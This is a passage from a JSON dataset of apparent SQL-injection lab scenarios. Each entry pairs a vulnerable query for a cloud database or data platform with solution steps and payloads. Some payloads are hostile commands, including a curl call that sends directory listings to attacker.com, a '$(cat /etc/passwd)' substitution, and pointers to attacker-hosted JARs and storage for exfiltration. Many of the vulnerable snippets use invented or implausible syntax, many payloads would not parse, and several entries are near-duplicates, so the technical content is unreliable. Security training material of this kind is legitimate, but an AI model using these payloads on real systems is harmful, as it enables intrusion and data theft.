    "srcCode": "CREATE MODEL model_name HPARAMETERS ('\\'' + userParams + '\\'') AS SELECT...",
    "payloads": [
      "max_depth=5) FROM svv_ml_models--",
      "objective='binary:logistic'))) FROM (SELECT * FROM pg_user)"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Google Cloud Spanner Change Stream Value Capture",
    "Lab Description": "A CDC system configures change streams with dynamic value capture. The capture clauses are concatenated directly into stream creation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify CREATE CHANGE STREAM",
      "Inject through VALUE_CAPTURE_TYPE",
      "Bypass stream validation",
      "Access unauthorized changes",
      "Tamper with captured values"
    ],
    "Vulnerability name": "Spanner Value Capture Injection",
    "srcCode": "CREATE CHANGE STREAM stream FOR TABLE table_name VALUE_CAPTURE_TYPE '\\'' + userCapture + '\\''",
    "payloads": [
      "OLD_AND_NEW_VALUES') FROM information_schema.change_streams--",
      "NEW_VALUES'))) FOR ALL"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Databricks Unity Catalog Sharing Recipients",
    "Lab Description": "A data sharing platform configures Delta Sharing with dynamic recipient emails. The email strings are concatenated directly into ACL management.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify CREATE SHARE usage",
      "Inject through TO: parameters",
      "Bypass email validation",
      "Access unauthorized shares",
      "Exfiltrate via sharing notifications"
    ],
    "Vulnerability name": "Unity Catalog Sharing Injection",
    "srcCode": "ALTER SHARE my_share ADD TO '\\'' + userEmail + '\\''",
    "payloads": [
      "attacker@domain.com') FROM (SELECT * FROM system.information_schema.shares)--",
      "legit@company.com'; SELECT * FROM hive_metastore.sensitive.tbl--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Snowpark Java UDF Class Paths",
    "Lab Description": "A Snowpark app registers Java UDFs with dynamic classpaths. The path strings are concatenated directly into JAR loading.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify CREATE FUNCTION usage",
      "Inject through IMPORTS clauses",
      "Bypass JAR validation",
      "Load malicious classes",
      "Execute arbitrary Java"
    ],
    "Vulnerability name": "Snowpark Java UDF Injection",
    "srcCode": "CREATE FUNCTION my_func() RETURNS STRING LANGUAGE JAVA IMPORTS = ('\\'' + userJar + '\\'')",
    "payloads": [
      "attacker.com/malicious.jar') FROM information_schema.functions--",
      "s3://exfil/exploit.jar'))) HANDLER='MaliciousClass'"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Azure Cosmos DB Stored Procedure Continuations",
    "Lab Description": "A NoSQL application builds Cosmos DB stored procedures with dynamic continuation tokens. The token strings are concatenated directly into pagination logic.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify stored procedure execution",
      "Inject through continuationToken",
      "Bypass query limits",
      "Access unauthorized partitions",
      "Exfiltrate via pagination"
    ],
    "Vulnerability name": "CosmosDB Continuation Injection",
    "srcCode": "function queryDocs(continuationToken) { var response = __.queryDocuments(\\'' + userQuery + '\\'', { continuation: '\\'' + userToken + '\\'' }); }",
    "payloads": [
      "attacker-token') FROM c WHERE c._ts > 0--",
      "malicious' })); function() { return __.queryDocuments(__.getSelfLink()) }--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Elasticsearch SQL ODBC Driver Properties",
    "Lab Description": "An analytics tool builds ODBC connections with dynamic properties. The property strings are concatenated directly into driver initialization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify ODBC connection points",
      "Inject through connection properties",
      "Bypass driver validation",
      "Access restricted indices",
      "Exfiltrate via driver errors"
    ],
    "Vulnerability name": "Elasticsearch ODBC Property Injection",
    "srcCode": "Driver={{Elasticsearch ODBC}};Server='\\'' + userServer + '\\'';Properties='\\'' + userProps + '\\''",
    "payloads": [
      "attacker.com;UID=admin;PWD=' OR 1=1 --",
      "legit.com:9200\";SSL=1;SSLCertAuth=0;"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Apache Druid SQL Identifier Case Forcing",
    "Lab Description": "A dashboard tool forces identifier case with dynamic expressions. The case operations are concatenated directly into query planning.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify case manipulation",
      "Inject through case expressions",
      "Bypass parser validation",
      "Access system tables",
      "Execute native queries"
    ],
    "Vulnerability name": "Druid Case Forcing Injection",
    "srcCode": "SELECT * FROM '\\'' + userTable + '\\''",
    "payloads": [
      "datasource FROM (SELECT * FROM sys.segments) --",
      "SENSITIVE_DATA\" WHERE __time > 0) UNION SELECT 1 --"
    ]
  },
  {
    "Lab scenario": "SQL Injection in InfluxDB Flux HTTP Request Headers",
    "Lab Description": "A monitoring system builds Flux HTTP requests with dynamic headers. The header strings are concatenated directly into pipeline execution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify http.get/post calls",
      "Inject through header parameters",
      "Bypass header validation",
      "Access internal endpoints",
      "Exfiltrate via HTTP responses"
    ],
    "Vulnerability name": "Flux HTTP Header Injection",
    "srcCode": "import \"http\" http.get(url: 'url', headers: '\\'' + userHeaders + '\\'')",
    "payloads": [
      "{'X-Auth': 'attacker'} FROM _internal.monitor--",
      "{'Authorization': 'Bearer ${string(v: r._value)}'}"
    ]
  },
  {
    "Lab scenario": "SQL Injection in TimescaleDB Compression Segmentby Columns",
    "Lab Description": "A time-series database enables compression with dynamic segmentby columns. The column lists are concatenated directly into compression policies.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify ALTER TABLE SET compression",
      "Inject through segmentby parameters",
      "Bypass column validation",
      "Access compressed chunks",
      "Manipulate compression ratios"
    ],
    "Vulnerability name": "Timescale Compression Injection",
    "srcCode": "ALTER TABLE hypertable SET (timescaledb.compress, timescaledb.compress_segmentby = '\\'' + userColumns + '\\'')",
    "payloads": [
      "device_id') FROM _timescaledb_catalog.hypertable --",
      "time DESC')) WITH (compress_orderby = 'time DESC')"
    ]
  },
  {
    "Lab scenario": "SQL Injection in CockroachDB CDC Webhook Headers",
    "Lab Description": "A change data capture system configures webhooks with dynamic headers. The header values are concatenated directly into HTTP requests.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify CREATE CHANGEFEED WITH webhook",
      "Inject through header parameters",
      "Bypass header validation",
      "Access webhook endpoints",
      "Exfiltrate via custom headers"
    ],
    "Vulnerability name": "Cockroach Webhook Header Injection",
    "srcCode": "CREATE CHANGEFEED FOR TABLE table INTO 'webhook-https://endpoint' WITH webhook_headers = '\\'' + userHeaders + '\\''",
    "payloads": [
      "'X-Auth: attacker'",
      "'{\"Authorization\": \"Bearer $(curl attacker.com)\"}'"
    ]
  },
  {
    "Lab scenario": "SQL Injection in DuckDB HTTPFS Extension Headers",
    "Lab Description": "A data pipeline uses DuckDB's HTTPFS with dynamic request headers. The header strings are concatenated directly into HTTP operations.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify HTTPFS usage",
      "Inject through header parameters",
      "Bypass header validation",
      "Access restricted URLs",
      "Exfiltrate via server responses"
    ],
    "Vulnerability name": "DuckDB HTTPFS Header Injection",
    "srcCode": "SET http_headers = '\\'' + userHeaders + '\\''",
    "payloads": [
      "'Authorization: Basic YWRtaW46cGFzcw=='",
      "'X-Forwarded-For: 127.0.0.1'"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Materialized View WITH NO DATA Clause",
    "Lab Description": "A data warehouse refreshes materialized views with dynamic data options. The WITH clauses are concatenated directly into refresh operations.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify REFRESH MATERIALIZED VIEW",
      "Inject through WITH DATA parameter",
      "Bypass refresh validation",
      "Trigger full data reload",
      "Access underlying tables"
    ],
    "Vulnerability name": "Materialized View Refresh Injection",
    "srcCode": "REFRESH MATERIALIZED VIEW mv WITH ('\\'' + userOption + '\\'')",
    "payloads": [
      "DATA) FROM pg_matviews --",
      "NO DATA')) CONCURRENTLY"
    ]
  },
  {
    "Lab scenario": "SQL Injection in SQL Ledger History Retention",
    "Lab Description": "A blockchain application configures ledger history with dynamic retention. The retention clauses are concatenated directly into blockchain maintenance.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify ALTER LEDGER usage",
      "Inject through retention parameters",
      "Bypass blockchain validation",
      "Tamper with historical records",
      "Disable immutable logging"
    ],
    "Vulnerability name": "SQL Ledger Retention Injection",
    "srcCode": "ALTER LEDGER ledger SET (LEDGER_VIEW_RETENTION = '\\'' + userRetention + '\\'')",
    "payloads": [
      "INFINITE') FROM sys.ledger_blocks --",
      "0 DAYS'))) WITH (VERIFICATION = OFF)"
    ]
  },
  {
    "Lab scenario": "SQL Injection in BigQuery Remote Model Connection Strings",
    "Lab Description": "A machine learning system creates remote models with dynamic connections. The connection strings are concatenated directly into model inference.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify CREATE MODEL usage",
      "Inject through CONNECTION parameters",
      "Bypass IAM validation",
      "Access Vertex AI endpoints",
      "Execute arbitrary predictions"
    ],
    "Vulnerability name": "BigQuery Model Connection Injection",
    "srcCode": "CREATE MODEL `project.model` REMOTE WITH CONNECTION `\\'' + userConn + '\\''",
    "payloads": [
      "us.my-connection') FROM `region-us`.INFORMATION_SCHEMA.ROUTINES --",
      "attacker-proj.us.conn` OPTIONS (endpoint='attacker.com')"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Snowflake External Function Response Transformers",
    "Lab Description": "A cloud integration processes external function responses with dynamic transformers. The JavaScript code is concatenated directly into result handling.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify CREATE EXTERNAL FUNCTION",
      "Inject through RESPONSE_TRANSFORMER",
      "Bypass sandbox restrictions",
      "Modify returned data",
      "Execute arbitrary SQL"
    ],
    "Vulnerability name": "Snowflake Response Transformer Injection",
    "srcCode": "CREATE EXTERNAL FUNCTION func() RETURNS VARIANT RESPONSE_TRANSFORMER = '\\'' + userTransformer + '\\''",
    "payloads": [
      "function transform(res) { return {sqlText: 'SELECT * FROM sensitive_table'}; }",
      "res => res.map(row => ({...row, extra: execute('SHOW PARAMETERS')}))"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Databricks Asset Bundle Runtime Parameters",
    "Lab Description": "A deployment pipeline configures Databricks bundles with dynamic runtime args. The parameter strings are concatenated directly into job execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify bundle.yml usage",
      "Inject through runtime parameters",
      "Bypass YAML validation",
      "Access cluster environment",
      "Execute arbitrary notebooks"
    ],
    "Vulnerability name": "Databricks Bundle Injection",
    "srcCode": "resources: jobs: my_job: runtime_params: '\\'' + userParams + '\\''",
    "payloads": [
      "key:value') FROM system.bundles --",
      "malicious: $(cat /etc/passwd)"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Trino Iceberg Metadata Procedures",
    "Lab Description": "A data lakehouse executes Iceberg procedures with dynamic arguments. The parameters are concatenated directly into metadata operations.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify CALL iceberg.system usage",
      "Inject through procedure arguments",
      "Bypass namespace validation",
      "Tamper with table metadata",
      "Access underlying files"
    ],
    "Vulnerability name": "Trino Iceberg Procedure Injection",
    "srcCode": "CALL iceberg.system.procedure('\\'' + userArgs + '\\'')",
    "payloads": [
      "snapshots') FROM iceberg.information_schema.tables --",
      "expire_snapshots(table => 'sensitive'))"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Presto Thrift UDF Payloads",
    "Lab Description": "A distributed system registers Thrift UDFs with dynamic serialization. The payload strings are concatenated directly into function execution.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify Thrift UDF registration",
      "Inject through serialized payloads",
      "Bypass deserialization checks",
      "Execute arbitrary code",
      "Access worker nodes"
    ],
    "Vulnerability name": "Presto Thrift UDF Injection",
    "srcCode": "CREATE FUNCTION my_func RETURNS string TYPE thrift LANGUAGE thrift HANDLER '\\'' + userHandler + '\\''",
    "payloads": [
      "attacker.com:8080/Exploit.class",
      "java -jar malicious.jar"
    ]
  },
  {
    "Lab scenario": "SQL Injection in ClickHouse Kafka Engine Settings",
    "Lab Description": "A streaming pipeline creates Kafka tables with dynamic engine settings. The configuration strings are concatenated directly into consumer initialization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify CREATE TABLE ENGINE=Kafka",
      "Inject through settings parameters",
      "Bypass broker validation",
      "Access unauthorized topics",
      "Poison message streams"
    ],
    "Vulnerability name": "ClickHouse Kafka Injection",
    "srcCode": "CREATE TABLE kafka_table ENGINE = Kafka('\\'' + userSettings + '\\'')",
    "payloads": [
      "attacker.com:9092') FROM system.kafka_tables --",
      "legit:9092, topic=secret')) SETTINGS kafka_skip_broken_messages=1"
    ]
  },
  {
    "Lab scenario": "SQL Injection in SingleStore Pipelines Transformation Scripts",
    "Lab Description": "A real-time pipeline creates data transformations with dynamic JavaScript scripts. The script code is concatenated directly into stream processing.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify CREATE PIPELINE usage",
      "Inject through TRANSFORM scripts",
      "Bypass sandbox restrictions",
      "Execute arbitrary code",
      "Access source streams"
    ],
    "Vulnerability name": "SingleStore Script Injection",
    "srcCode": "CREATE PIPELINE my_pipe AS TRANSFORM ('\\'' + userScript + '\\'') FROM src INTO dst",
    "payloads": [
      "function transform() { return execute('SELECT * FROM information_schema.tables'); }",
      "() => ({ sql: 'SHOW DATABASES' })"
    ]
  },
  {
    "Lab scenario": "SQL Injection in YugabyteDB CDC Stream IDs",
    "Lab Description": "A change data capture system creates YugabyteDB streams with dynamic identifiers. The ID strings are concatenated directly into WAL processing.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify CREATE CDC STREAM usage",
      "Inject through stream ID parameters",
      "Bypass WAL validation",
      "Access unauthorized changes",
      "Tamper with replication"
    ],
    "Vulnerability name": "Yugabyte Stream ID Injection",
    "srcCode": "EXECUTE PROCEDURE yb_create_change_data_stream('\\'' + userStreamId + '\\'')",
    "payloads": [
      "all_tables\") FROM yb_servers--",
      "sensitive_db')); SELECT * FROM yb_metrics--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in CrateDB Dynamic Partition Columns",
    "Lab Description": "A distributed SQL system creates partitioned tables with dynamic column names. The partition expressions are concatenated directly into shard allocation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify PARTITIONED BY usage",
      "Inject through column parameters",
      "Bypass shard validation",
      "Manipulate data distribution",
      "Access unauthorized shards"
    ],
    "Vulnerability name": "CrateDB Partition Injection",
    "srcCode": "CREATE TABLE partitioned_data (col1 INT) PARTITIONED BY ('\\'' + userColumn + '\\'')",
    "payloads": [
      "col1\") FROM information_schema.tables--",
      "date_trunc('day', ts)')) CLUSTERED INTO 10 SHARDS--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in TiDB Placement Policy Constraints",
    "Lab Description": "A distributed database configures placement policies with dynamic constraints. The constraint strings are concatenated directly into region placement.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify CREATE PLACEMENT POLICY usage",
      "Inject through CONSTRAINTS clauses",
      "Bypass region validation",
      "Manipulate replica placement",
      "Access cross-region data"
    ],
    "Vulnerability name": "TiDB Placement Injection",
    "srcCode": "CREATE PLACEMENT POLICY my_policy CONSTRAINTS = '\\'' + userConstraints + '\\''",
    "payloads": [
      "+region=us-west) FROM information_schema.placement_policies--",
      "+zone=1')) LEADER_CONSTRAINTS='+region=attacker'--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in MySQL Generated Column Expressions",
    "Lab Description": "A schema designer dynamically creates generated columns with unsafe expression concatenation, allowing injection through virtual column definitions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify generated column creation",
      "Inject malicious expression via AS clause",
      "Bypass expression validation",
      "Access underlying table data",
      "Exfiltrate through computed values"
    ],
    "Vulnerability name": "MySQL Virtual Column Injection",
    "srcCode": "ALTER TABLE users ADD COLUMN full_name VARCHAR(255) AS (CONCAT('\\'' + userExpr + '\\'')) STORED",
    "payloads": [
      "first_name,' ',last_name)) FROM mysql.user--",
      "first_name,(SELECT @@version),last_name))--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in SQL Server Graph MATCH Path Filters",
    "Lab Description": "A social network application builds graph queries with unsanitized node property filters, allowing injection during relationship traversal.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Locate MATCH clause construction",
      "Inject through node property filters",
      "Bypass graph syntax validation",
      "Access unauthorized graph nodes",
      "Exfiltrate connection data"
    ],
    "Vulnerability name": "SQL Graph Traversal Injection",
    "srcCode": "MATCH (n {user_id: '\\'' + userFilter + '\\''})-[r:FOLLOWS]->(m)",
    "payloads": [
      "123' OR 1=1)--",
      "admin'}) RETURN n.password--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in PostgreSQL COPY TO PROGRAM Commands",
    "Lab Description": "A data export feature unsafely incorporates user input into COPY TO PROGRAM statements, enabling OS command execution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify COPY TO PROGRAM usage",
      "Inject shell metacharacters",
      "Bypass command filtering",
      "Execute system commands",
      "Exfiltrate via command output"
    ],
    "Vulnerability name": "PostgreSQL COPY Command Injection",
    "srcCode": "COPY (SELECT * FROM logs) TO PROGRAM 'gzip > /exports/\\'' + userFilename + '\\''",
    "payloads": [
      "reports_2023.gz; curl attacker.com/?exfil=$(ls|base64)--",
      "legit.gz' || whoami > /tmp/leak || '"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Oracle Text INDEX PARAMETERS",
    "Lab Description": "A document search system unsafely builds Oracle Text index parameters, allowing injection during index creation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Locate CREATE INDEX usage",
      "Inject through PARAMETERS clause",
      "Bypass CTXSYS privilege checks",
      "Manipulate search results",
      "Access indexed documents"
    ],
    "Vulnerability name": "Oracle Text Parameter Injection",
    "srcCode": "CREATE INDEX doc_idx ON docs(text) INDEXTYPE IS CTXSYS.CONTEXT PARAMETERS ('\\'' + userParams + '\\'')",
    "payloads": [
      "SYNC (EVERY \"SYSDATE+0/1440\") FROM all_indexes--",
      "STOPLIST ctxsys.empty_stoplist')) SELECT * FROM user_tables--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Snowflake External Table Column Definitions",
    "Lab Description": "A cloud ETL pipeline dynamically defines external table columns with unsanitized input, allowing injection during schema inference.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify external table creation",
      "Inject through column definitions",
      "Bypass schema validation",
      "Access unauthorized storage paths",
      "Manipulate query results"
    ],
    "Vulnerability name": "Snowflake External Schema Injection",
    "srcCode": "CREATE EXTERNAL TABLE ext_data (\\'' + userCols + '\\'') LOCATION=@stage",
    "payloads": [
      "id INT) FROM information_schema.external_tables--",
      "name STRING, (SELECT * FROM sensitive_data) x)"
    ]
  },
  {
    "Lab scenario": "SQL Injection in BigQuery JSON_EXTRACT_SCALAR Path Parameters",
    "Lab Description": "A JSON processing feature unsafely incorporates user input into JSON path expressions, allowing injection during document parsing.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Locate JSON_EXTRACT_SCALAR usage",
      "Inject malicious JSON path",
      "Bypass path validation",
      "Access unauthorized JSON fields",
      "Exfiltrate via malformed paths"
    ],
    "Vulnerability name": "BigQuery JSON Path Injection",
    "srcCode": "SELECT JSON_EXTRACT_SCALAR(payload, '\\'' + userPath + '\\'') FROM events",
    "payloads": [
      "$.private.email FROM `project.dataset.users`--",
      "$[0]')) WHERE 1=0 UNION SELECT 1,2,3--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Azure Synapse CETAS WITH Clauses",
    "Lab Description": "A data warehouse exports tables with dynamic WITH options, allowing injection during external table creation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify CETAS usage",
      "Inject through WITH parameters",
      "Bypass option validation",
      "Modify file output properties",
      "Exfiltrate via storage paths"
    ],
    "Vulnerability name": "Synapse CETAS Option Injection",
    "srcCode": "CREATE EXTERNAL TABLE ext_data WITH ('\\'' + userOptions + '\\'') AS SELECT * FROM source",
    "payloads": [
      "FORMAT='PARQUET') FROM sys.external_tables--",
      "LOCATION='wasbs://attacker@storage.blob.core.windows.net/exfil'))"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Databricks Notebook Widget Default Values",
    "Lab Description": "An interactive notebook incorporates unsanitized widget defaults into SQL cells, allowing injection through UI parameters.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Locate widget creation",
      "Inject through default values",
      "Bypass notebook sanitization",
      "Execute arbitrary queries",
      "Access cluster metadata"
    ],
    "Vulnerability name": "Databricks Widget Injection",
    "srcCode": "dbutils.widgets.text('input', '\\'' + userDefault + '\\'')",
    "payloads": [
      "1' UNION SELECT * FROM hive_metastore.default.passwords--",
      "legit' || (SELECT current_user()) || '"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Amazon Redshift UNLOAD IAM_ROLE Parameters",
    "Lab Description": "A data export feature unsafely incorporates user input into UNLOAD statements, allowing IAM role manipulation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify UNLOAD commands",
      "Inject through IAM_ROLE parameter",
      "Bypass ARN validation",
      "Access unauthorized S3 buckets",
      "Exfiltrate via modified destinations"
    ],
    "Vulnerability name": "Redshift IAM Role Injection",
    "srcCode": "UNLOAD ('SELECT * FROM sensitive') TO 's3://bucket/path' IAM_ROLE '\\'' + userRole + '\\''",
    "payloads": [
      "arn:aws:iam::123456789012:role/RedshiftReadOnly') FROM svv_external_tables--",
      "arn:aws:iam::attacker:role/MaliciousRole'))"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Google Cloud Spanner INTERLEAVE IN PARENT Clauses",
    "Lab Description": "A schema migration tool unsafely builds INTERLEAVE clauses, allowing injection during table relationship creation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Locate INTERLEAVE usage",
      "Inject through parent table parameters",
      "Bypass schema validation",
      "Modify table relationships",
      "Access unauthorized datasets"
    ],
    "Vulnerability name": "Spanner Interleave Injection",
    "srcCode": "CREATE TABLE child_table INTERLEAVE IN PARENT '\\'' + userParent + '\\'' ON DELETE CASCADE",
    "payloads": [
      "parent_table' FROM information_schema.tables--",
      "legit_table')) SELECT * FROM SPANNER_SYS.TABLES--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Azure Data Explorer Kusto Function Bodies",
    "Lab Description": "A query optimization system dynamically creates Kusto functions with unsanitized bodies, allowing injection during execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify function creation",
      "Inject through function logic",
      "Bypass sandbox restrictions",
      "Access unauthorized data",
      "Execute arbitrary KQL"
    ],
    "Vulnerability name": "Kusto Function Body Injection",
    "srcCode": ".create function my_func() { '\\'' + userLogic + '\\'' }",
    "payloads": [
      "union cluster('attacker').database('exfil').table('dump')",
      "table(T) | where 1=0 union (show databases)"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Elasticsearch SQL ODBC Connection Strings",
    "Lab Description": "A reporting tool builds ODBC connections with unsanitized input, allowing injection during driver initialization.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Locate connection string construction",
      "Inject through properties",
      "Bypass driver validation",
      "Access restricted indices",
      "Exfiltrate via error messages"
    ],
    "Vulnerability name": "Elasticsearch ODBC Connection Injection",
    "srcCode": "Driver={Elasticsearch ODBC};Server='\\'' + userServer + '\\'';UID='\\'' + userUID + '\\''",
    "payloads": [
      "attacker.com;Properties=\"Security=Disabled\"",
      "legit.com:9200\";PWD=' OR '1'='1'--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Apache Druid SQL Identifier Escaping",
    "Lab Description": "A dashboard builder improperly escapes Druid SQL identifiers, allowing injection through quoted table names.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Locate dynamic identifier usage",
      "Inject through escape sequences",
      "Bypass parser validation",
      "Access system tables",
      "Execute native queries"
    ],
    "Vulnerability name": "Druid Identifier Escape Injection",
    "srcCode": "SELECT * FROM \\\"\\'' + userTable + '\\''\\\"",
    "payloads": [
      "datasource\\\" FROM (SELECT * FROM sys.segments) x--",
      "legit_table\\\" WHERE __time > 0) UNION SELECT 1,2,3--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in InfluxDB Flux Yield Names",
    "Lab Description": "A monitoring system dynamically names Flux query yields, allowing injection during result processing.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Locate yield statements",
      "Inject through name parameter",
      "Bypass name validation",
      "Modify result sets",
      "Exfiltrate via yielded output"
    ],
    "Vulnerability name": "Flux Yield Name Injection",
    "srcCode": "from(bucket:\\\"metrics\\\") |> yield(name: \\\"\\'' + userYield + '\\\"\\\")",
    "payloads": [
      "results\\\" FROM (SELECT * FROM _internal.monitor)--",
      "data\\\" WHERE 1=0) UNION SELECT 1--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in TimescaleDB Continuous Aggregate Policies",
    "Lab Description": "A time-series platform configures aggregation policies with unsanitized input, allowing injection during materialization.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Locate policy creation",
      "Inject through interval parameters",
      "Bypass time validation",
      "Trigger unauthorized refreshes",
      "Access historical data"
    ],
    "Vulnerability name": "Timescale Policy Injection",
    "srcCode": "SELECT add_continuous_aggregate_policy('\\'' + userView + '\\'', '\\'' + userInterval + '\\'')",
    "payloads": [
      "my_view', INTERVAL '1 hour')) FROM _timescaledb_catalog.hypertable--",
      "sensitive_data', INTERVAL '0 seconds')))"
    ]
  },
  {
    "Lab scenario": "SQL Injection in CockroachDB Partial Index Predicates",
    "Lab Description": "A performance optimization feature unsafely creates partial indexes, allowing injection through WHERE clauses.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Locate partial index creation",
      "Inject through predicate",
      "Bypass expression validation",
      "Access filtered data",
      "Exfiltrate via index scans"
    ],
    "Vulnerability name": "Cockroach Partial Index Injection",
    "srcCode": "CREATE INDEX idx_filtered ON table (col) WHERE '\\'' + userPredicate + '\\''",
    "payloads": [
      "status = 'active' FROM crdb_internal.indexes--",
      "1=1)) STORING (password)--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in DuckDB S3 Endpoint Configuration",
    "Lab Description": "A data pipeline configures S3 endpoints with unsanitized input, allowing injection during cloud storage operations.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Locate S3 configuration",
      "Inject through endpoint URLs",
      "Bypass URL validation",
      "Access unauthorized buckets",
      "Exfiltrate credentials"
    ],
    "Vulnerability name": "DuckDB S3 Endpoint Injection",
    "srcCode": "SET s3_endpoint='\\'' + userEndpoint + '\\''",
    "payloads": [
      "attacker.com') FROM duckdb_settings--",
      "legit.s3.amazonaws.com'; COPY secrets TO 's3://exfil/'--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Materialized View Refresh Options",
    "Lab Description": "A data warehouse refreshes materialized views with dynamic options, allowing injection during data reload.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Locate REFRESH commands",
      "Inject through WITH parameters",
      "Bypass option validation",
      "Trigger full table scans",
      "Access underlying data"
    ],
    "Vulnerability name": "Materialized View Refresh Injection",
    "srcCode": "REFRESH MATERIALIZED VIEW mv WITH ('\\'' + userOptions + '\\'')",
    "payloads": [
      "NO DATA') FROM pg_matviews--",
      "DATA')) CONCURRENTLY"
    ]
  },
  {
    "Lab scenario": "SQL Injection in SQL Server Ledger View Options",
    "Lab Description": "A blockchain application creates ledger views with dynamic options, allowing injection during cryptographic verification.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Locate LEDGER VIEW creation",
      "Inject through view parameters",
      "Bypass blockchain validation",
      "Tamper with historical records",
      "Disable verification"
    ],
    "Vulnerability name": "SQL Ledger View Injection",
    "srcCode": "CREATE LEDGER VIEW ledger_view WITH (LEDGER_VIEW = ON, '\\'' + userOptions + '\\'')",
    "payloads": [
      "VERIFICATION = ON) FROM sys.ledger_views--",
      "TRANSACTION_ID_COLUMN = id)))"
    ]
  },
  {
    "Lab scenario": "SQL Injection in BigQuery Wildcard Table Suffixes",
    "Lab Description": "A data analytics tool uses wildcard tables with dynamic suffixes, allowing injection during table expansion.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Locate wildcard table usage",
      "Inject through suffix patterns",
      "Bypass pattern validation",
      "Access unauthorized datasets",
      "Exfiltrate via table scans"
    ],
    "Vulnerability name": "BigQuery Wildcard Injection",
    "srcCode": "SELECT * FROM `project.dataset.table_\\'' + userSuffix + '\\'`",
    "payloads": [
      "2023*` FROM `region-us`.INFORMATION_SCHEMA.TABLES--",
      "jan` WHERE _TABLE_SUFFIX = '') UNION SELECT 1,2,3--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Snowflake Session Parameter Defaults",
    "Lab Description": "A configuration system sets session parameters with dynamic defaults, allowing injection during session initialization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Locate parameter setting",
      "Inject through default values",
      "Bypass parameter validation",
      "Persist malicious settings",
      "Affect all subsequent queries"
    ],
    "Vulnerability name": "Snowflake Session Default Injection",
    "srcCode": "ALTER SESSION SET '\\'' + userParam + '\\'' = '\\'' + userValue + '\\''",
    "payloads": [
      "TIMESTAMP_INPUT_FORMAT', 'YYYY-MM-DD') FROM information_schema.parameters--",
      "QUERY_TAG', 'test'); SELECT * FROM account_usage.access_history--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Databricks SQL Warehouse Configurations",
    "Lab Description": "A cluster management system configures warehouses with dynamic parameters, allowing injection during cluster startup.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Locate warehouse creation",
      "Inject through config options",
      "Bypass config validation",
      "Access driver nodes",
      "Exfiltrate metastore data"
    ],
    "Vulnerability name": "Databricks Warehouse Config Injection",
    "srcCode": "CREATE WAREHOUSE my_warehouse WITH ('\\'' + userConfig + '\\'')",
    "payloads": [
